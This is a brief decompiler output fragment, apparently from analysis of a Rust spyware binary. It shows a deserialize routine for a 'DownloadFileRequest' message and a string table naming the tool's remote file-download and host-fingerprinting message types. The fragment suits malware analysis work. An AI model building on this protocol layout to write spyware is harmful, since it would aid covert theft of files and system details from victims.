long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::DownloadFileRequest>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_struct(a1, "DownloadFileRequestDownloadFileResponsefile_dataGetBasicInfoRequestplaceholderOperatingSystemWindowsLinuxFreeBSDMacOSIOSAndroidUnknownArchitecturex86x86_64powerpcpowerpc64armaarch64PointerWidthBit32Bit64GetBasicInfoResponseversiontarget_osoperating_system_", 19);
    return a0;
}
